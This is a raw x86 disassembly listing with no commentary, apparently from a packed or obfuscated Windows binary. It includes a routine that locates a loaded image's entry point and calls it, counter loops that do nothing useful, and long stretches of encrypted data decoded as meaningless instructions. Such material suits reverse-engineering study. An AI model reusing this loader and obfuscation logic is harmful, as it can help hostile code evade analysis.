  40698d:	jne    0x40692d
  406993:	jmp    0x4069c6
  406998:	add    ecx,0xffcd8d65
  40699e:	mov    esi,ecx
  4069a0:	xor    esi,eax
  4069a2:	add    esi,DWORD PTR [ebp+0x8]
  4069a5:	mov    DWORD PTR [ebp+0x8],esi
  4069a8:	mov    esi,DWORD PTR [ebp+0x8]
  4069ab:	xor    esi,ecx
  4069ad:	xor    esi,eax
  4069af:	mov    eax,DWORD PTR [edx+0x194]
  4069b5:	mov    ecx,DWORD PTR [eax]
  4069b7:	mov    eax,DWORD PTR [ecx+0x3c]
  4069ba:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  4069be:	add    eax,ecx
  4069c0:	mov    DWORD PTR [ebp+0x8],esi
  4069c3:	mov    DWORD PTR [ebp+0x10],eax
  4069c6:	mov    eax,DWORD PTR [ebp+0x10]
  4069c9:	pop    esi
  4069ca:	test   eax,eax
  4069cc:	jmp    0x406c4a
  4069d1:	gs aaa 
  4069d3:	jns    0x406a20
  4069d5:	dec    ecx
  4069d6:	jno    0x406a4d
  4069d8:	xor    DWORD PTR [ebp+0x696491c7],ecx
  4069de:	imul   ebx,edi,0x7ec76653
  4069e4:	jle    0x4069c5
  4069e6:	jl     0x406a66
  4069e8:	jle    0x406973
  4069ea:	jne    0x406a0b
  4069ec:	dec    edx
  4069ed:	jmp    0x4069e3
  4069ef:	jecxz  0x406a5a
  4069f1:	shl    BYTE PTR [edi+0x55ed30a9],1
  4069f7:	jbe    0x4069bf
  4069f9:	push   ebp
  4069fa:	jbe    0x406a6f
  4069fc:	cmovp  ebp,DWORD PTR [edx-0x1bb0b4de]
  406a03:	out    0x5b,al
  406a05:	mov    eax,ds:0xd9078ea8
  406a0a:	les    ebx,FWORD PTR [edx+0x67850868]
  406a10:	loopne 0x406a30
  406a12:	test   al,0xa5
  406a14:	mov    bl,0x9
  406a16:	push   ds
  406a17:	xor    al,0x95
  406a19:	ss and al,0xdd
  406a1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406a1d:	je     0x406a73
  406a1f:	adc    DWORD PTR [eax+0x5606e1e4],ebx
  406a25:	jg     0x4069d4
  406a27:	psllw  mm1,mm7
  406a2a:	pop    edi
  406a2b:	cld    
  406a2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406a2d:	cmp    DWORD PTR [esp+edi*4+0x75],0xffffff85
  406a32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406a33:	(bad)  
  406a34:	and    eax,0xe1e25ab3
  406a39:	shr    ah,1
  406a3b:	push   ebx
  406a3c:	cmp    eax,0x6ced3341
  406a41:	in     al,0x43
  406a43:	pop    eax
  406a44:	mov    ebp,ebx
  406a46:	scas   eax,DWORD PTR es:[edi]
  406a47:	les    ebx,FWORD PTR [ecx-0x20]
  406a4a:	mov    cs,WORD PTR [eax+0x3af1cfd]
  406a50:	adc    edx,edx
  406a52:	sub    DWORD PTR [ebp+ecx*4+0x45af2213],esp
  406a59:	pop    di
  406a5b:	sub    ebp,0xfffffff7
  406a5e:	inc    edx
  406a5f:	lods   al,BYTE PTR ds:[esi]
  406a60:	ins    DWORD PTR es:[edi],dx
  406a61:	fsub   DWORD PTR [ebp+0x37]
  406a64:	or     BYTE PTR ds:0xd0f60d09,al
  406a6a:	bound  edi,QWORD PTR [ecx+0x1e]
  406a6d:	jne    0x406ad0
  406a6f:	mov    ecx,0x7f2eac1e
  406a74:	or     bh,BYTE PTR [ebx]
  406a76:	and    BYTE PTR [eax],bh
  406a78:	jle    0x406a38
  406a7a:	jne    0x406abc
  406a7c:	inc    ebp
  406a7d:	pusha  
  406a7e:	enter  0x54fc,0xa7
  406a82:	(bad)  
  406a83:	pop    ecx
  406a84:	hlt    
  406a85:	jne    0x406ac7
  406a87:	mov    al,0x61
  406a89:	adc    esp,DWORD PTR [edi+0xd8dc6b4]
  406a8f:	dec    ebx
  406a90:	sub    DWORD PTR [edi-0x6ad776d3],esi
  406a96:	push   esp
  406a97:	mov    ecx,0xcd06e3b2
  406a9c:	and    DWORD PTR [ecx+0x65583544],0xe66a078e
  406aa6:	in     eax,dx
  406aa7:	ror    BYTE PTR [ebx],1
  406aa9:	fstp   QWORD PTR [ecx-0x6f]
  406aac:	clc    
  406aad:	push   edi
  406aae:	mov    cl,0xc4
  406ab0:	shl    DWORD PTR [eax+0x45ef46eb],cl
  406ab6:	add    edx,DWORD PTR [esi-0x4ee3daa2]
  406abc:	mov    ah,0xd4
  406abe:	or     BYTE PTR [edi],ah
  406ac0:	out    0x17,eax
  406ac2:	leave  
  406ac3:	lock mov dh,0xce
  406ac6:	mov    dl,0x7
  406ac8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406ac9:	iret   
  406aca:	in     al,dx
  406acb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406acc:	jge    0x406a5e
  406ace:	ror    DWORD PTR [ebp+0x36],1
  406ad1:	push   ss
  406ad2:	leave  
  406ad3:	pop    ebp
  406ad4:	mov    edi,DWORD PTR [ebx-0x7bcde5e9]
  406ada:	dec    ecx
  406adb:	adc    esp,DWORD PTR [ecx]
  406add:	das    
  406ade:	or     DWORD PTR [eax],0xffffffa3
  406ae1:	f2xm1  
  406ae3:	mov    ah,0xfc
  406ae5:	inc    eax
  406ae6:	push   es
  406ae7:	jns    0x406a6b
  406ae9:	test   ecx,ecx
  406aeb:	push   ebx
  406aec:	cmc    
  406aed:	fdiv   DWORD PTR [edx+0x1ddd21c9]
  406af3:	add    DWORD PTR [edx],0x26f78750
  406af9:	xchg   BYTE PTR [esi+0x6e10f349],dl
  406aff:	adc    bl,bl
  406b01:	(bad)  
  406b02:	mov    bl,0x17
  406b04:	pop    ebx
  406b05:	adc    al,0xad
  406b07:	mov    bl,0x22
  406b09:	inc    ebp
  406b0a:	aad    0x60
  406b0c:	mov    dh,0x84
  406b0e:	fs shl cl,0x41
  406b12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406b13:	div    DWORD PTR [edx]
  406b15:	or     al,cl
  406b17:	pop    ebx
  406b18:	loopne 0x406aab
  406b1a:	dec    edx
  406b1b:	mov    DWORD PTR [ebp-0x32],edi
  406b1e:	cli    
  406b1f:	iret   
  406b20:	dec    ebp
  406b21:	(bad)  
  406b23:	dec    eax
  406b24:	mov    edi,0xdcd4a894
  406b29:	mov    ch,0xc
  406b2b:	cmp    ecx,DWORD PTR [esi]
  406b2d:	fdivr  QWORD PTR ds:0x534081e0
  406b33:	or     ch,BYTE PTR [edi]
  406b35:	cwde   
  406b36:	test   DWORD PTR [ecx+0x7b],edx
  406b39:	dec    eax
  406b3a:	jmp    0x5d636170
  406b3f:	mov    DWORD PTR [ecx],ebx
  406b41:	jmp    0x406b43
  406b43:	pop    es
  406b44:	mov    esi,0x1eb96250
  406b49:	sbb    BYTE PTR [edx-0x1bd2d770],bh
  406b4f:	adc    DWORD PTR [ebp+0x33218bd5],eax
  406b55:	push   eax
  406b56:	xchg   BYTE PTR [ebp+0x3],bh
  406b59:	sbb    dh,BYTE PTR [eax]
  406b5b:	aas    
  406b5c:	test   al,0xea
  406b5e:	xor    eax,0x50a4c7cb
  406b63:	shl    DWORD PTR [edi+ebx*4],cl
  406b66:	lds    esi,FWORD PTR [ebp-0xe2f5107]
  406b6c:	inc    esp
  406b6d:	cwde   
  406b6e:	not    DWORD PTR [ebx]
  406b70:	cmp    DWORD PTR [edi-0x1d],edi
  406b73:	std    
  406b74:	pop    edi
  406b75:	adc    ecx,ecx
  406b77:	popa   
  406b78:	mov    edx,0xb51ba93
  406b7d:	push   ss
  406b7e:	clc    
  406b7f:	jae    0x406b5f
  406b81:	sub    BYTE PTR ds:0x72b9f165,dh
  406b87:	jo     0x406b91
  406b89:	jbe    0x406b33
  406b8b:	rol    ecx,1
  406b8d:	jg     0x406b1b
  406b8f:	inc    esp
  406b90:	and    ebp,DWORD PTR [ebx]
  406b92:	mov    ebp,0x2f6050dd
  406b97:	adc    DWORD PTR [eax-0x4d52400e],eax
  406b9d:	push   esi
  406b9e:	push   eax
  406b9f:	mov    ebp,0x11c44493
  406ba4:	mov    dl,0xcd
  406ba6:	sahf   
  406ba7:	dec    edi
  406ba8:	mul    DWORD PTR [esi+eiz*4-0x33]
  406bac:	push   ebp
  406bad:	inc    eax
  406bae:	aaa    
  406baf:	pop    esp
  406bb0:	jp     0x406bca
  406bb2:	(bad)  
  406bb3:	push   ds
  406bb4:	cmp    BYTE PTR [eax],0x73
  406bb7:	xchg   ebx,eax
  406bb8:	mov    ds:0x8279a5c5,eax
  406bbd:	out    0x4e,al
  406bbf:	xchg   edx,eax
  406bc0:	and    dh,ah
  406bc2:	shr    DWORD PTR [ebp+0x6b94df9f],1
  406bc8:	arpl   cx,bp
  406bca:	sub    esi,DWORD PTR [ecx]
  406bcc:	(bad)  
  406bcd:	xor    ah,bh
  406bcf:	jecxz  0x406bc0
  406bd1:	iret   
  406bd2:	push   edi
  406bd3:	add    BYTE PTR [ebp-0x5004c817],cl
  406bd9:	pop    ss
  406bda:	iret   
  406bdb:	mov    DWORD PTR [eax-0x48],ebx
  406bde:	addr16 out 0x21,al
  406be1:	sbb    al,BYTE PTR [ebx]
  406be3:	xchg   ebp,eax
  406be4:	fiadd  DWORD PTR [edi+0x5c315d46]
  406bea:	adc    al,0x4c
  406bec:	xlat   BYTE PTR ds:[ebx]
  406bed:	jecxz  0x406bc6
  406bef:	xchg   ebx,eax
  406bf0:	idiv   BYTE PTR [edi+0x3d]
  406bf3:	mov    bh,BYTE PTR [edi]
  406bf5:	add    eax,DWORD PTR [ecx+0x60]
  406bf8:	adc    DWORD PTR [eax-0x2e],ecx
  406bfb:	and    DWORD PTR [esi],eax
  406bfd:	pop    ss
  406bfe:	push   eax
  406bff:	mov    esi,0xaa09f4b2
  406c04:	push   eax
  406c05:	jmp    0x7eee:0x610967e8
  406c0c:	dec    ecx
  406c0d:	je     0x406bbb
  406c0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406c10:	leave  
  406c11:	xchg   ecx,ebp
  406c13:	fmul   st(4),st
  406c15:	or     BYTE PTR [ecx+ebp*2],cl
  406c18:	loop   0x406c13
  406c1a:	mov    BYTE PTR [edx+ecx*4-0x63a1ba25],ah
  406c21:	mov    ss,WORD PTR [ebp-0x6974e812]
  406c27:	mov    ah,0xee
  406c29:	push   ss
  406c2a:	inc    edi
  406c2b:	inc    ebp
  406c2c:	icebp  
  406c2d:	int3   
  406c2e:	mov    al,ds:0x136064de
  406c33:	fwait
  406c34:	dec    eax
  406c35:	xor    al,0xdf
  406c37:	mov    ebp,DWORD PTR [esi-0x48c57522]
  406c3d:	sub    DWORD PTR [edi+edx*2+0x7bdb9e92],edi
  406c44:	frstor [eax+eiz*4+0xf17110f]
  406c4b:	test   BYTE PTR [edx+eax*1+0x35ff0000],bl
  406c52:	mov    dh,0x3c
  406c54:	inc    ecx
  406c55:	add    bh,bh
  406c57:	xor    eax,0x413a62
  406c5c:	mov    eax,DWORD PTR [edx+0x194]
  406c62:	push   DWORD PTR [eax]
  406c64:	mov    eax,DWORD PTR [ebp+0x10]
  406c67:	call   eax
  406c69:	jmp    0x406eef
  406c6e:	jmp    0x406eec
  406c73:	push   ebx
  406c74:	jo     0x406c41
  406c76:	es jmp 0xfbb1e021
  406c7c:	mov    edi,0x59042bde
  406c81:	jo     0x406c31
  406c83:	mov    edx,0x7cdf7e7e
  406c89:	jle    0x406d09
  406c8b:	dec    edi
  406c8c:	addr16 out 0x7e,al
  406c8f:	dec    eax
  406c90:	mov    ecx,0x230948a5
  406c95:	and    DWORD PTR [esi+ebx*4-0x54],0xfffffff5
  406c9a:	fld    QWORD PTR [eax+0x17]
  406c9d:	sbb    BYTE PTR [eax],cl
  406c9f:	ret    
  406ca0:	mov    al,0x5b
  406ca2:	mov    ds:0x8ccb40cd,eax
  406ca7:	ffreep st(2)
  406ca9:	cld    
  406caa:	push   0x39
  406cac:	sub    ecx,DWORD PTR [ebx+0x26]
  406caf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406cb0:	inc    ebp
  406cb1:	scas   eax,DWORD PTR es:[edi]
  406cb2:	dec    eax
  406cb3:	aam    0xd9
  406cb5:	push   ebp
  406cb6:	dec    ebx
  406cb8:	inc    edi
  406cb9:	push   ebp
  406cba:	mov    ebp,0xb60ec1e1
  406cbf:	inc    esi
  406cc0:	das    
  406cc1:	mov    cs,WORD PTR [esi-0x6f67e3c2]
  406cc7:	jle    0x406d3a
  406cc9:	or     al,0xe1
  406ccb:	outs   dx,BYTE PTR ds:[esi]
  406ccc:	dec    BYTE PTR [ecx+0x2153b134]
  406cd2:	mov    ebp,0xfb38e3be
  406cd7:	inc    edx
  406cd8:	gs stc 
  406cda:	lds    ebp,FWORD PTR [esi]
  406cdc:	add    al,0x53
  406cde:	jmp    0x406c62
  406ce0:	retf   0x9eb8
  406ce3:	pop    edi
  406ce4:	adc    BYTE PTR [ecx-0x7abc3b53],bh
  406cea:	mov    dh,0x49
  406cec:	mov    dl,0x99
  406cee:	mov    ds:0x99a34fe7,al
  406cf3:	mov    al,ds:0xf322641f
  406cf8:	pop    ecx
  406cf9:	pop    ds
  406cfa:	dec    edx
  406cfb:	dec    eax
  406cfc:	xor    esi,ebp
  406cfe:	test   bl,ah
  406d00:	leave  
  406d01:	mov    bh,0xc8
  406d03:	xchg   ebx,eax
  406d04:	sbb    dl,BYTE PTR [ebp-0x54]
  406d07:	dec    eax
  406d08:	in     eax,dx
  406d09:	scas   al,BYTE PTR es:[edi]
  406d0a:	ja     0x406d0d
  406d0c:	dec    eax
  406d0d:	pop    ds
  406d0e:	cmp    al,0xfa
  406d10:	pop    edx
  406d11:	or     al,al
  406d13:	repz mov bl,0x48
  406d16:	mov    ecx,0x4bb087f5
  406d1b:	jge    0x406d48
  406d1d:	jne    0x406d97
  406d1f:	mov    esi,0xdc611b02
  406d24:	dec    edx
  406d25:	mov    dh,BYTE PTR ds:0xbe8cefd9
  406d2b:	jg     0x406d4f
  406d2d:	ss cld 
  406d2f:	push   0x39
  406d31:	in     al,0xf7
  406d33:	xlat   BYTE PTR ds:[ebx]
  406d34:	enter  0xae73,0xa9
  406d38:	jecxz  0x406d3a
  406d3a:	jp     0x406cf2
  406d3c:	jle    0x406d0f
  406d3e:	pop    esp
  406d3f:	je     0x406d2a
  406d41:	jl     0x406cdc
  406d43:	add    eax,0xadd9915c
  406d48:	pop    edx
  406d49:	out    0x18,eax
  406d4b:	dec    ecx
  406d4c:	test   edi,esi
  406d4e:	xchg   ecx,eax
  406d4f:	and    BYTE PTR [edx-0x15],dl
  406d52:	jbe    0x406ce2
  406d54:	jg     0x406d4b
  406d56:	mov    dh,0xdc
  406d58:	outs   dx,BYTE PTR ds:[esi]
  406d59:	std    
  406d5a:	cld    
  406d5b:	stc    
  406d5c:	fdiv   DWORD PTR [eax+0x380f512]
  406d62:	lahf   
  406d63:	cwde   
  406d64:	cs or  eax,0x447ac091
  406d6a:	aad    0xd1
  406d6c:	and    DWORD PTR [edi+0x13],edi
  406d6f:	xor    al,0x79
  406d71:	in     eax,0xc4
  406d73:	mov    al,ds:0x3582a21c
  406d78:	lods   eax,DWORD PTR ds:[esi]
  406d79:	and    BYTE PTR [ecx+0xe9bc257],0x4
  406d80:	mov    ch,0xd7
  406d82:	ss sbb al,0xdc
  406d85:	stos   DWORD PTR es:[edi],eax
  406d86:	aas    
  406d87:	push   ebx
  406d88:	test   DWORD PTR [esi-0x5206ba4b],esi
  406d8e:	pop    esp
  406d8f:	cs sbb eax,0x82905441
  406d95:	stos   DWORD PTR es:[edi],eax
  406d96:	cli    
  406d97:	jmp    0x406d80
  406d99:	(bad)  
  406d9a:	push   0x7ee49702
  406d9f:	test   al,0xfa
  406da1:	stos   DWORD PTR es:[edi],eax
  406da2:	push   ss
  406da3:	dec    esi
  406da4:	jecxz  0x406e07
  406da6:	mov    ebx,ecx
  406da8:	jo     0x406df8
  406daa:	clc    
  406dab:	arpl   WORD PTR [edi-0x59],dx
  406dae:	mov    cl,0xcd
  406db0:	add    eax,0xf4c9691a
  406db5:	dec    DWORD PTR ds:0x77b726fd
  406dbb:	mov    bl,0x11
  406dbd:	xor    ecx,esp
  406dbf:	mov    bh,0x34
  406dc1:	jmp    DWORD PTR [ebx+ebx*8+0x1d]
  406dc5:	adc    al,0xa8
  406dc7:	pop    ebp
  406dc8:	cmp    BYTE PTR [ecx-0xeb65688],0x7a
  406dcf:	pop    ss
  406dd0:	ret    
  406dd1:	rol    BYTE PTR [edi],1
  406dd3:	inc    edi
  406dd4:	fs (bad) 
  406dd7:	adc    dh,BYTE PTR ds:0x7af1ed70
  406ddd:	sahf   
  406dde:	add    DWORD PTR [ebx],ebp
  406de0:	ss and eax,0x52daaed0
  406de6:	daa    
  406de7:	mov    DWORD PTR [eax+esi*8-0x2e],ebx
  406deb:	push   es
  406dec:	daa    
  406ded:	push   ecx
  406dee:	faddp  st(7),st
  406df0:	into   
  406df1:	jmp    FWORD PTR [ecx+0x3ef53b78]
  406df7:	(bad)  
  406df8:	mov    dl,0xe6
  406dfa:	(bad)  
  406dfb:	call   0x6d7e:0xd0741161
  406e02:	outs   dx,BYTE PTR ds:[esi]
  406e03:	addr16 pop ecx
  406e05:	jge    0x406e38
  406e07:	cmp    BYTE PTR [eax],0x71
  406e0a:	pop    ds
  406e0b:	and    edx,DWORD PTR [ebx+ebp*1]
  406e0e:	retf   0x4389
  406e11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e12:	push   edi
  406e13:	(bad)  
  406e14:	into   
  406e15:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e17:	dec    esi
  406e18:	add    BYTE PTR [ecx+0x7bc9cb88],cl
  406e1e:	fdivr  DWORD PTR [edi-0x14e2f8aa]
  406e24:	cmp    eax,0x3b37f042
  406e29:	inc    ebp
  406e2a:	adc    al,0x4b
  406e2c:	mov    eax,ds:0x19ecb69e
  406e31:	loopne 0x406ea6
  406e33:	and    DWORD PTR [ecx+0x69ab323],ecx
  406e39:	in     eax,dx
  406e3a:	add    DWORD PTR [esp+eiz*8-0x74],ecx
  406e3e:	xor    edi,edi
  406e40:	rol    BYTE PTR [eax+0x42],cl
  406e43:	add    ecx,edx
  406e45:	dec    ecx
  406e46:	fist   WORD PTR [esi+0x7d348089]
  406e4c:	sub    BYTE PTR [ecx+0x4141c395],cl
  406e52:	adc    DWORD PTR [eax],0x4e
  406e55:	xchg   edx,eax
  406e56:	loop   0x406e95
  406e58:	repz inc esp
  406e5a:	inc    ecx
  406e5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e5c:	and    BYTE PTR [ebp+0x3c],al
  406e5f:	in     eax,dx
  406e60:	mov    ah,0x44
  406e62:	das    
  406e63:	jle    0x406df6
  406e65:	cmp    eax,0xf9408fdb
  406e6a:	repz dec edx
  406e6c:	sbb    DWORD PTR [ebx],ebp
  406e6e:	iret   
  406e6f:	int    0x72
  406e71:	(bad)  
  406e72:	(bad)  
  406e74:	(bad)  
  406e75:	ins    BYTE PTR es:[edi],dx
  406e76:	aas    
  406e77:	sub    DWORD PTR [edi-0x17fdb0c],eax
  406e7d:	pop    ss
  406e7e:	ret    
  406e7f:	popa   
  406e80:	and    BYTE PTR [edx+ecx*1],ah
  406e83:	sub    DWORD PTR [edx],ecx
  406e85:	dec    edi
  406e86:	(bad)  
  406e87:	call   0x173eabed
  406e8c:	test   al,0xe5
  406e8e:	sahf   
  406e8f:	je     0x406eca
  406e91:	cmp    DWORD PTR [eax+0x64a7684],edi
  406e97:	dec    ebp
  406e98:	sub    eax,DWORD PTR [edi]
  406e9a:	(bad)  
  406e9b:	pop    esi
  406e9c:	pop    ss
  406e9d:	or     BYTE PTR [edi],dl
  406e9f:	addr16 retf 0xc4ca
  406ea3:	push   0xfffffff3
  406ea5:	mov    cl,bh
  406ea7:	imul   esi,eax,0x65727dd8
  406ead:	dec    esp
  406eae:	jb     0x406f14
  406eb0:	in     eax,dx
  406eb1:	inc    esp
  406eb2:	fdiv   DWORD PTR ds:0x9107f019
  406eb8:	out    dx,al
  406eb9:	hlt    
  406eba:	jge    0x406e4a
  406ebc:	out    dx,eax
  406ebd:	jo     0x406ea5
  406ebf:	fwait
  406ec0:	mov    ah,0xef
  406ec2:	xor    al,0xdc
  406ec4:	lahf   
  406ec5:	jecxz  0x406f20
  406ec7:	hlt    
  406ec8:	jge    0x406e5a
  406eca:	imul   ecx,ebx,0x3bf962d6
  406ed0:	sub    eax,0xbfe9dc23
  406ed5:	cmp    DWORD PTR [ecx-0x26ebad90],0x18fe27e8
  406edf:	mov    cl,0x5
  406ee1:	test   eax,0x8a59d6f4
  406ee6:	sar    BYTE PTR [ebx+0x27b0e68f],1
  406eec:	mov    eax,DWORD PTR [ebp+0x10]
  406eef:	leave  
  406ef0:	ret    0xc
  406ef3:	push   ebp
  406ef4:	mov    ebp,esp
  406ef6:	sub    esp,0x28
  406ef9:	mov    DWORD PTR ds:0x4337ef,0x71e2
  406f03:	push   0x413d5e
  406f08:	call   DWORD PTR ds:0x412420
  406f0e:	cmp    BYTE PTR [eax],0x0
  406f11:	mov    DWORD PTR ds:0x4337a3,0xa08
  406f1b:	je     0x406f32
  406f21:	and    DWORD PTR ds:0x4338af,0x433793
  406f2b:	xor    eax,eax
  406f2d:	jmp    0x407466
  406f32:	push   0x413da6
  406f37:	add    DWORD PTR ds:0x4338af,0x433827
  406f41:	call   DWORD PTR ds:0x4121d4
  406f47:	mov    DWORD PTR ds:0x43386b,0x6fd9
  406f51:	cmp    eax,0xa
  406f54:	mov    DWORD PTR ds:0x43383b,0x485d
  406f5e:	jl     0x406f21
  406f64:	add    ecx,DWORD PTR ds:0x4338a7
  406f6a:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  406f71:	mov    DWORD PTR ds:0x43387b,0x11
  406f7b:	cmp    DWORD PTR ds:0x43387b,0x0
  406f82:	je     0x406fdd
  406f88:	cmp    DWORD PTR ds:0x43387b,0x5
  406f8f:	jne    0x406fa5
  406f95:	push   0x7487
  406f9a:	push   0x4338e7
  406f9f:	call   DWORD PTR ds:0x4121c0
  406fa5:	cmp    DWORD PTR ds:0x43387b,0x6
  406fac:	jne    0x406fbf
  406fb2:	mov    ecx,DWORD PTR ds:0x43387b
  406fb8:	dec    ecx
  406fb9:	mov    DWORD PTR ds:0x43387b,ecx
  406fbf:	xor    ecx,ecx
  406fc1:	add    ecx,DWORD PTR ds:0x43387b
  406fc7:	dec    ecx
  406fc8:	mov    DWORD PTR ds:0x43387b,ecx
  406fce:	jmp    0x406f7b
  406fd3:	adc    DWORD PTR ds:0x4337ab,0x7658
  406fdd:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  406fe4:	mov    DWORD PTR ds:0x4337f3,0x15
  406fee:	cmp    DWORD PTR ds:0x4337f3,0x0
  406ff5:	je     0x407051
  406ffb:	cmp    DWORD PTR ds:0x4337f3,0x2
  407002:	jne    0x40701d
  407008:	push   0x4337fb
  40700d:	push   0x433883
  407012:	push   0x3143
  407017:	call   DWORD PTR ds:0x412360
  40701d:	cmp    DWORD PTR ds:0x4337f3,0x3
  407024:	jne    0x407039
  40702a:	xor    ecx,ecx
  40702c:	or     ecx,DWORD PTR ds:0x4337f3
  407032:	dec    ecx
  407033:	mov    DWORD PTR ds:0x4337f3,ecx
  407039:	mov    ecx,DWORD PTR ds:0x4337f3
  40703f:	dec    ecx
  407040:	mov    DWORD PTR ds:0x4337f3,ecx
  407046:	jmp    0x406fee
  40704b:	sbb    ecx,DWORD PTR ds:0x43387f
  407051:	lea    eax,[ebp-0x20]
  407054:	mov    DWORD PTR ds:0x4337af,0x1c
  40705e:	cmp    DWORD PTR ds:0x4337af,0x0
  407065:	je     0x4070a1
  40706b:	cmp    DWORD PTR ds:0x4337af,0x2b
  407072:	jne    0x407089
  407078:	push   DWORD PTR [ebp-0xc]
  40707b:	push   0x4337af
  407080:	push   DWORD PTR [ebp-0x24]
  407083:	call   DWORD PTR ds:0x4121c4
  407089:	mov    ecx,DWORD PTR ds:0x4337af
  40708f:	dec    ecx
  407090:	mov    DWORD PTR ds:0x4337af,ecx
  407096:	jmp    0x40705e
  40709b:	xor    ecx,0x624a
  4070a1:	mov    DWORD PTR [ebp-0x14],eax
  4070a4:	lea    eax,[ebp-0x1c]
  4070a7:	mov    DWORD PTR [ebp-0x10],eax
  4070aa:	adc    ecx,eax
  4070ac:	mov    eax,ds:0x413bde
  4070b1:	mov    ecx,DWORD PTR ds:0x4337c7
  4070b7:	mov    ecx,DWORD PTR [ecx]
  4070b9:	xor    DWORD PTR ds:0x433833,ecx
  4070bf:	mov    eax,DWORD PTR [eax+0x1c8]
  4070c5:	or     DWORD PTR ds:0x4337b3,0x1d95
  4070cf:	mov    eax,DWORD PTR [eax]
  4070d1:	sub    ecx,0x7a4e
  4070d7:	mov    ecx,DWORD PTR [ebp-0x10]
  4070da:	add    DWORD PTR ds:0x4337ef,0x4337a7
  4070e4:	push   ebx
  4070e5:	push   esi
  4070e6:	sub    DWORD PTR ds:0x43379f,ebx
  4070ec:	mov    esi,0x7510854
  4070f1:	and    DWORD PTR ds:0x433827,0x0
  4070fb:	mov    ebx,DWORD PTR ds:0x433827
  407101:	inc    ebx
  407102:	mov    DWORD PTR ds:0x433827,ebx
  407108:	cmp    DWORD PTR ds:0x433827,0x7
  40710f:	jne    0x407128
  407115:	push   DWORD PTR [ebp-0x1c]
  407118:	push   0x8eb0
  40711d:	push   0x3be9
  407122:	call   DWORD PTR ds:0x4121c8
  407128:	cmp    DWORD PTR ds:0x433827,0x6
  40712f:	jne    0x407144
  407135:	xor    ebx,ebx
  407137:	xor    ebx,DWORD PTR ds:0x433827
  40713d:	inc    ebx
  40713e:	mov    DWORD PTR ds:0x433827,ebx
  407144:	cmp    DWORD PTR ds:0x433827,0x15
  40714b:	jb     0x4070fb
  407151:	and    DWORD PTR ds:0x43386b,edi
  407157:	xor    eax,esi
  407159:	sub    ebx,DWORD PTR ds:0x43379b
  40715f:	push   edi
  407160:	xor    ebx,0x561f
  407166:	mov    edi,0x32729b
  40716b:	mov    DWORD PTR ds:0x4338c3,0x1c
  407175:	cmp    DWORD PTR ds:0x4338c3,0x0
  40717c:	je     0x407271
  407182:	cmp    DWORD PTR ds:0x4338c3,0x25
  407189:	jne    0x40719d
  40718f:	push   0x43391a
  407194:	push   DWORD PTR [ebp-0x20]
  407197:	call   DWORD PTR ds:0x412008
  40719d:	mov    ebx,DWORD PTR ds:0x4338c3
  4071a3:	dec    ebx
  4071a4:	mov    DWORD PTR ds:0x4338c3,ebx
  4071aa:	jmp    0x407175
  4071af:	and    DWORD PTR ds:0x43379f,0x0
  4071b9:	jmp    0x4071cb
  4071be:	mov    ebx,DWORD PTR ds:0x43379f
  4071c4:	inc    ebx
  4071c5:	mov    DWORD PTR ds:0x43379f,ebx
  4071cb:	cmp    DWORD PTR ds:0x43379f,0x1a
  4071d2:	jae    0x407271
  4071d8:	cmp    DWORD PTR ds:0x43379f,0x8
  4071df:	jne    0x4071f0
  4071e5:	push   0x2cbb
  4071ea:	call   DWORD PTR ds:0x41200c
  4071f0:	cmp    DWORD PTR ds:0x43379f,0x7
  4071f7:	jne    0x40720a
  4071fd:	mov    ebx,DWORD PTR ds:0x43379f
  407203:	inc    ebx
  407204:	mov    DWORD PTR ds:0x43379f,ebx
  40720a:	jmp    0x4071be
  40720f:	and    DWORD PTR ds:0x433803,0x0
  407219:	mov    ebx,DWORD PTR ds:0x433803
  40721f:	inc    ebx
  407220:	mov    DWORD PTR ds:0x433803,ebx
  407226:	cmp    DWORD PTR ds:0x433803,0x4
  40722d:	jne    0x407244
  407233:	push   DWORD PTR [ebp-0x10]
  407236:	push   0x347b
  40723b:	push   DWORD PTR [ebp-0xc]
  40723e:	call   DWORD PTR ds:0x412364
  407244:	cmp    DWORD PTR ds:0x433803,0x3
  40724b:	jne    0x40725e
  407251:	mov    ebx,DWORD PTR ds:0x433803
  407257:	inc    ebx
  407258:	mov    DWORD PTR ds:0x433803,ebx
  40725e:	cmp    DWORD PTR ds:0x433803,0x11
  407265:	jb     0x407219
  40726b:	adc    DWORD PTR ds:0x4337af,ebx
  407271:	add    eax,edi
  407273:	mov    DWORD PTR ds:0x43379f,0x2325
  40727d:	mov    DWORD PTR [ecx],eax
  40727f:	mov    DWORD PTR ds:0x433877,0x6c11
  407289:	mov    eax,ds:0x413e96
  40728e:	mov    ebx,0x7633
  407293:	cmp    eax,0x23c13046
  407298:	mov    eax,DWORD PTR [ebp-0x4]
  40729b:	mov    ebx,0xf89c853d
  4072a0:	je     0x4072b8
  4072a6:	mov    ecx,DWORD PTR [ebp-0x8]
  4072a9:	xor    eax,esi
  4072ab:	add    eax,edi
  4072ad:	imul   eax,ecx
  4072b0:	mov    DWORD PTR [ebp-0x8],eax
  4072b3:	jmp    0x4072ef
  4072b8:	xor    eax,esi
  4072ba:	add    eax,edi
  4072bc:	mov    ds:0x413cf2,eax
  4072c1:	mov    eax,DWORD PTR [ebp-0x8]
  4072c4:	xor    eax,esi
  4072c6:	add    eax,edi
  4072c8:	mov    ds:0x413e96,eax
  4072cd:	mov    eax,DWORD PTR [ebp-0x4]
  4072d0:	mov    ecx,DWORD PTR ds:0x413cf2
  4072d6:	xor    eax,esi
  4072d8:	add    eax,edi
  4072da:	cmp    ecx,eax
  4072dc:	jne    0x4072ef
  4072e2:	push   ebx
  4072e3:	push   DWORD PTR [ebp-0x4]
  4072e6:	push   DWORD PTR [ebp-0x8]
  4072e9:	call   DWORD PTR ds:0x413cea
